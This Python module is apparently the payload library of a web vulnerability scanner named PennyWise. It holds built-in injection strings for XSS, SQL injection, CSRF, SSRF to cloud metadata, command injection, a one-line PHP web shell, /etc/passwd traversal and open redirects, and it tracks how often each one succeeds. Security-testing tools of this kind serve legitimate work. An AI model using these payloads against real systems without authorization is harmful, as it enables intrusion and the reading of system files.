"""
Dynamic Payload Library for PennyWise.
Manages attack payloads with runtime customization and effectiveness tracking.
"""

import json
import logging
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
from pathlib import Path
from enum import Enum

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Attack types for payload categorization."""
    XSS = "xss"
    SQLI = "sqli"
    CSRF = "csrf"
    AUTH = "auth"
    SSRF = "ssrf"
    IDOR = "idor"
    RCE = "rce"
    LFI = "lfi"
    XXE = "xxe"
    OPEN_REDIRECT = "open_redirect"


@dataclass
class Payload:
    """A single attack payload with metadata."""
    vector: str
    attack_type: AttackType
    category: str = "basic"
    effectiveness: float = 0.5
    evasion_type: str = "none"
    tags: List[str] = field(default_factory=list)
    last_used: Optional[str] = None
    success_count: int = 0
    failure_count: int = 0

    @property
    def success_rate(self) -> float:
        """Calculate success rate."""
        total = self.success_count + self.failure_count
        return self.success_count / total if total > 0 else 0.5

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            'vector': self.vector,
            'attack_type': self.attack_type.value,
            'category': self.category,
            'effectiveness': self.effectiveness,
            'evasion_type': self.evasion_type,
            'tags': self.tags,
            'last_used': self.last_used,
            'success_count': self.success_count,
            'failure_count': self.failure_count
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Payload':
        """Create from dictionary."""
        return cls(
            vector=data['vector'],
            attack_type=AttackType(data['attack_type']),
            category=data.get('category', 'basic'),
            effectiveness=data.get('effectiveness', 0.5),
            evasion_type=data.get('evasion_type', 'none'),
            tags=data.get('tags', []),
            last_used=data.get('last_used'),
            success_count=data.get('success_count', 0),
            failure_count=data.get('failure_count', 0)
        )


class PayloadLibrary:
    """
    Dynamic payload management system.

    Features:
    - Runtime payload addition/removal
    - Effectiveness tracking and ranking
    - Persistence across sessions
    - Category-based organization
    """

    def __init__(self, storage_path: str = "./pennywise_data/payloads"):
        self.storage_path = Path(storage_path)
        self.storage_path.mkdir(parents=True, exist_ok=True)

        self.payloads: Dict[str, List[Payload]] = {}
        self.effectiveness_file = self.storage_path / 'effectiveness.json'
        self.custom_file = self.storage_path / 'custom_payloads.json'

        self._load_built_in_payloads()
        self._load_custom_payloads()
        self._load_effectiveness_data()

        logger.info(f"Payload library initialized with {self._count_payloads()} payloads")

    def _load_built_in_payloads(self):
        """Load built-in payload collections."""
        self.payloads = {
            'xss': self._get_xss_payloads(),
            'sqli': self._get_sqli_payloads(),
            'csrf': self._get_csrf_payloads(),
            'auth': self._get_auth_payloads(),
            'ssrf': self._get_ssrf_payloads(),
            'idor': self._get_idor_payloads(),
            'rce': self._get_rce_payloads(),
            'lfi': self._get_lfi_payloads(),
            'open_redirect': self._get_open_redirect_payloads()
        }

    def _get_xss_payloads(self) -> List[Payload]:
        """Get XSS payload collection."""
        return [
            Payload("<script>alert('XSS')</script>", AttackType.XSS, "basic", 0.8),
            Payload("<img src=x onerror=alert('XSS')>", AttackType.XSS, "basic", 0.7),
            Payload("<svg onload=alert('XSS')>", AttackType.XSS, "basic", 0.6),
            Payload("'><script>alert('XSS')</script>", AttackType.XSS, "basic", 0.7),
            Payload("javascript:alert('XSS')", AttackType.XSS, "basic", 0.5),
            Payload("<iframe src='javascript:alert(1)'></iframe>", AttackType.XSS, "basic", 0.6),
            Payload("<body onload=alert('XSS')>", AttackType.XSS, "basic", 0.5),
            Payload("<input onfocus=alert('XSS') autofocus>", AttackType.XSS, "basic", 0.6),
            Payload("<details open ontoggle=alert('XSS')>", AttackType.XSS, "basic", 0.5),
            Payload("<marquee onstart=alert('XSS')>", AttackType.XSS, "basic", 0.4),
            # Advanced payloads
            Payload("<img src=x onerror='alert(String.fromCharCode(88,83,83))'>", AttackType.XSS, "advanced", 0.7),
            Payload("</script><script>alert('XSS')</script>", AttackType.XSS, "advanced", 0.6),
            Payload("<ScRiPt>alert('XSS')</ScRiPt>", AttackType.XSS, "evasion", 0.5),
            Payload("<img src=\"x\" onerror=\"alert(1)\">", AttackType.XSS, "evasion", 0.6),
            Payload("<svg><script>alert('XSS')</script></svg>", AttackType.XSS, "advanced", 0.5),
        ]

    def _get_sqli_payloads(self) -> List[Payload]:
        """Get SQL injection payload collection."""
        return [
            # String-based payloads (for quoted string inputs)
            Payload("' OR '1'='1", AttackType.SQLI, "basic", 0.8),
            Payload("' OR '1'='1' --", AttackType.SQLI, "basic", 0.7),
            Payload("' OR '1'='1' #", AttackType.SQLI, "basic", 0.7),
            Payload("\" OR \"1\"=\"1", AttackType.SQLI, "basic", 0.6),
            Payload("1' OR '1'='1", AttackType.SQLI, "basic", 0.7),
            Payload("' UNION SELECT NULL--", AttackType.SQLI, "union", 0.6),
            Payload("' UNION SELECT NULL,NULL--", AttackType.SQLI, "union", 0.5),
            Payload("' AND 1=CONVERT(int,(SELECT @@version))--", AttackType.SQLI, "error", 0.4),
            Payload("' AND SLEEP(5)--", AttackType.SQLI, "blind", 0.5),
            Payload("'; EXEC xp_cmdshell('dir')--", AttackType.SQLI, "advanced", 0.3),
            
            # Numeric payloads (for unquoted numeric inputs)
            Payload("1 OR 1=1", AttackType.SQLI, "numeric", 0.9),
            Payload("1 OR 1=1 --", AttackType.SQLI, "numeric", 0.8),
            Payload("999 OR 1=1", AttackType.SQLI, "numeric", 0.8),
            Payload("1 UNION SELECT NULL--", AttackType.SQLI, "numeric_union", 0.7),
            Payload("1 UNION SELECT NULL,NULL--", AttackType.SQLI, "numeric_union", 0.6),
            Payload("1 AND 1=CONVERT(int,(SELECT @@version))--", AttackType.SQLI, "numeric_error", 0.5),
            Payload("1 AND SLEEP(5)--", AttackType.SQLI, "numeric_blind", 0.6),
        ]

    def _get_csrf_payloads(self) -> List[Payload]:
        """Get CSRF payload collection."""
        return [
            Payload("<form action='/transfer' method='POST'><input name='amount' value='1000'><input name='to' value='attacker'></form><script>document.forms[0].submit()</script>", AttackType.CSRF, "basic", 0.6),
            Payload("<img src='/transfer?amount=1000&to=attacker'>", AttackType.CSRF, "basic", 0.5),
        ]

    def _get_auth_payloads(self) -> List[Payload]:
        """Get authentication payload collection."""
        return [
            Payload("admin", AttackType.AUTH, "username", 0.3),
            Payload("password", AttackType.AUTH, "password", 0.2),
            Payload("123456", AttackType.AUTH, "password", 0.4),
            Payload("admin123", AttackType.AUTH, "password", 0.3),
            Payload("' OR '1'='1' --", AttackType.AUTH, "sqli", 0.6),
            Payload("admin'--", AttackType.AUTH, "sqli", 0.5),
        ]

    def _get_ssrf_payloads(self) -> List[Payload]:
        """Get SSRF payload collection."""
        return [
            Payload("http://127.0.0.1:22", AttackType.SSRF, "basic", 0.7),
            Payload("http://localhost:3306", AttackType.SSRF, "basic", 0.6),
            Payload("http://169.254.169.254/latest/meta-data/", AttackType.SSRF, "aws", 0.5),
            Payload("file:///etc/passwd", AttackType.SSRF, "file", 0.4),
        ]

    def _get_idor_payloads(self) -> List[Payload]:
        """Get IDOR payload collection."""
        return [
            Payload("../admin/users", AttackType.IDOR, "path", 0.6),
            Payload("?user_id=1", AttackType.IDOR, "parameter", 0.7),
            Payload("?user_id=2", AttackType.IDOR, "parameter", 0.7),
            Payload("/api/user/1", AttackType.IDOR, "api", 0.6),
        ]

    def _get_rce_payloads(self) -> List[Payload]:
        """Get RCE payload collection."""
        return [
            Payload("; ls -la", AttackType.RCE, "basic", 0.5),
            Payload("| cat /etc/passwd", AttackType.RCE, "basic", 0.4),
            Payload("$(whoami)", AttackType.RCE, "basic", 0.6),
            Payload("`id`", AttackType.RCE, "basic", 0.5),
            Payload("<?php system($_GET['cmd']); ?>", AttackType.RCE, "php", 0.3),
        ]

    def _get_lfi_payloads(self) -> List[Payload]:
        """Get LFI payload collection."""
        return [
            Payload("../../../../etc/passwd", AttackType.LFI, "basic", 0.7),
            Payload("....//....//....//....//etc/passwd", AttackType.LFI, "evasion", 0.5),
            Payload("..%2f..%2f..%2fetc%2fpasswd", AttackType.LFI, "encoded", 0.6),
            Payload("/proc/self/environ", AttackType.LFI, "proc", 0.4),
        ]

    def _get_open_redirect_payloads(self) -> List[Payload]:
        """Get Open Redirect payload collection."""
        return [
            Payload("//evil.com", AttackType.OPEN_REDIRECT, "basic", 0.8),
            Payload("http://evil.com", AttackType.OPEN_REDIRECT, "basic", 0.7),
            Payload("//google.com", AttackType.OPEN_REDIRECT, "basic", 0.6),
            Payload("javascript:alert(1)", AttackType.OPEN_REDIRECT, "xss", 0.4),
        ]

    def _load_custom_payloads(self):
        """Load custom payloads from storage."""
        if self.custom_file.exists():
            try:
                with open(self.custom_file, 'r') as f:
                    data = json.load(f)
                    for attack_type, payloads in data.items():
                        if attack_type not in self.payloads:
                            self.payloads[attack_type] = []
                        for payload_data in payloads:
                            payload = Payload.from_dict(payload_data)
                            self.payloads[attack_type].append(payload)
                logger.info(f"Loaded custom payloads from {self.custom_file}")
            except Exception as e:
                logger.error(f"Failed to load custom payloads: {e}")

    def _load_effectiveness_data(self):
        """Load effectiveness tracking data."""
        if self.effectiveness_file.exists():
            try:
                with open(self.effectiveness_file, 'r') as f:
                    effectiveness_data = json.load(f)
                    # Update payloads with effectiveness data
                    for attack_type, payloads in self.payloads.items():
                        for payload in payloads:
                            if payload.vector in effectiveness_data:
                                data = effectiveness_data[payload.vector]
                                payload.success_count = data.get('success_count', 0)
                                payload.failure_count = data.get('failure_count', 0)
                                payload.effectiveness = payload.success_rate
                logger.info(f"Loaded effectiveness data from {self.effectiveness_file}")
            except Exception as e:
                logger.error(f"Failed to load effectiveness data: {e}")

    def _save_custom_payloads(self):
        """Save custom payloads to storage."""
        custom_data = {}
        for attack_type, payloads in self.payloads.items():
            if attack_type != 'custom':
                continue
            custom_data[attack_type] = [p.to_dict() for p in payloads]

        try:
            with open(self.custom_file, 'w') as f:
                json.dump(custom_data, f, indent=2)
            logger.info(f"Saved custom payloads to {self.custom_file}")
        except Exception as e:
            logger.error(f"Failed to save custom payloads: {e}")

    def _save_effectiveness_data(self):
        """Save effectiveness tracking data."""
        effectiveness_data = {}
        for attack_type, payloads in self.payloads.items():
            for payload in payloads:
                effectiveness_data[payload.vector] = {
                    'success_count': payload.success_count,
                    'failure_count': payload.failure_count,
                    'effectiveness': payload.effectiveness
                }

        try:
            with open(self.effectiveness_file, 'w') as f:
                json.dump(effectiveness_data, f, indent=2)
            logger.info(f"Saved effectiveness data to {self.effectiveness_file}")
        except Exception as e:
            logger.error(f"Failed to save effectiveness data: {e}")

    def add_custom_payload(self,
                          attack_type: AttackType,
                          vector: str,
                          category: str = "custom",
                          tags: List[str] = None) -> bool:
        """Add a custom payload at runtime."""
        if attack_type.value not in self.payloads:
            self.payloads[attack_type.value] = []

        # Check if payload already exists
        for existing in self.payloads[attack_type.value]:
            if existing.vector == vector:
                logger.warning(f"Payload already exists: {vector}")
                return False

        payload = Payload(
            vector=vector,
            attack_type=attack_type,
            category=category,
            tags=tags or []
        )

        self.payloads[attack_type.value].append(payload)
        self._save_custom_payloads()
        logger.info(f"Added custom payload: {vector}")
        return True

    def remove_payload(self, vector: str) -> bool:
        """Remove a payload."""
        for attack_type, payloads in self.payloads.items():
            for i, payload in enumerate(payloads):
                if payload.vector == vector:
                    del payloads[i]
                    self._save_custom_payloads()
                    logger.info(f"Removed payload: {vector}")
                    return True
        return False

    def get_payloads(self,
                    attack_type: AttackType,
                    limit: int = None,
                    sort_by_effectiveness: bool = True,
                    category: str = None,
                    learner: Any = None) -> List[Payload]:
        """Get payloads for an attack type, optionally incorporating learner rankings."""
        attack_key = attack_type.value
        if attack_key not in self.payloads:
            return []

        payloads = self.payloads[attack_key].copy()

        # Filter by category if specified
        if category:
            payloads = [p for p in payloads if p.category == category]

        # Incorporate learner rankings if available
        if learner and hasattr(learner, 'get_payload_ranking'):
            try:
                learner_ranking = learner.get_payload_ranking(attack_key)
                if learner_ranking:
                    # Create a ranking map for quick lookup
                    rank_map = {payload: i for i, payload in enumerate(learner_ranking)}
                    
                    # Sort payloads by learner ranking first, then by effectiveness
                    def sort_key(p):
                        learner_rank = rank_map.get(p.vector, len(learner_ranking))
                        return (learner_rank, -p.effectiveness)
                    
                    payloads.sort(key=sort_key)
            except Exception as e:
                logger.warning(f"Failed to incorporate learner rankings: {e}")
                # Fall back to effectiveness sorting
                if sort_by_effectiveness:
                    payloads.sort(key=lambda p: p.effectiveness, reverse=True)
        elif sort_by_effectiveness:
            # Default sorting by effectiveness
            payloads.sort(key=lambda p: p.effectiveness, reverse=True)

        # Limit results
        if limit:
            payloads = payloads[:limit]

        return payloads

    def record_result(self, vector: str, success: bool):
        """Record the result of using a payload."""
        for attack_type, payloads in self.payloads.items():
            for payload in payloads:
                if payload.vector == vector:
                    if success:
                        payload.success_count += 1
                    else:
                        payload.failure_count += 1
                    payload.effectiveness = payload.success_rate
                    self._save_effectiveness_data()
                    logger.debug(f"Recorded {'success' if success else 'failure'} for payload: {vector}")
                    return

        logger.warning(f"Payload not found for result recording: {vector}")

    def get_stats(self) -> Dict[str, Any]:
        """Get library statistics."""
        total_payloads = self._count_payloads()
        effectiveness_stats = {}

        for attack_type, payloads in self.payloads.items():
            if payloads:
                avg_effectiveness = sum(p.effectiveness for p in payloads) / len(payloads)
                effectiveness_stats[attack_type] = {
                    'count': len(payloads),
                    'avg_effectiveness': round(avg_effectiveness, 2)
                }

        return {
            'total_payloads': total_payloads,
            'attack_types': list(self.payloads.keys()),
            'effectiveness_stats': effectiveness_stats
        }

    def _count_payloads(self) -> int:
        """Count total payloads in library."""
        return sum(len(payloads) for payloads in self.payloads.values())

    def export_payloads(self, filepath: str):
        """Export all payloads to JSON file."""
        export_data = {}
        for attack_type, payloads in self.payloads.items():
            export_data[attack_type] = [p.to_dict() for p in payloads]

        with open(filepath, 'w') as f:
            json.dump(export_data, f, indent=2)
        logger.info(f"Exported payloads to {filepath}")

    def import_payloads(self, filepath: str):
        """Import payloads from JSON file."""
        with open(filepath, 'r') as f:
            import_data = json.load(f)

        imported_count = 0
        for attack_type, payloads in import_data.items():
            if attack_type not in self.payloads:
                self.payloads[attack_type] = []

            for payload_data in payloads:
                payload = Payload.from_dict(payload_data)
                # Check if already exists
                exists = any(p.vector == payload.vector for p in self.payloads[attack_type])
                if not exists:
                    self.payloads[attack_type].append(payload)
                    imported_count += 1

        self._save_custom_payloads()
        logger.info(f"Imported {imported_count} payloads from {filepath}")